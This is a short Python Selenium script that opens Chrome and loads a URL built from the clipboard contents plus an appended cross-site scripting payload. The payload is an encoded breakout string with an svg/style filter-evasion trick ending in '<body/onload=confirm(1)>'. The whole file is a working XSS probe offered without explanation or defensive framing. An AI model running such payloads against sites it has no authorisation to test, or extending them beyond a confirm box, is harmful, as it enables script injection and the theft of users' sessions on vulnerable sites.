from selenium import webdriver
import os
import pyperclip as pc
driver = webdriver.Chrome(executable_path="9.exe")
driver.maximize_window()
driver.get('{} &#34;&#62;<svg><style>{-o-link-source&colon;<body/onload=confirm(1)>'.format(pc.paste()))
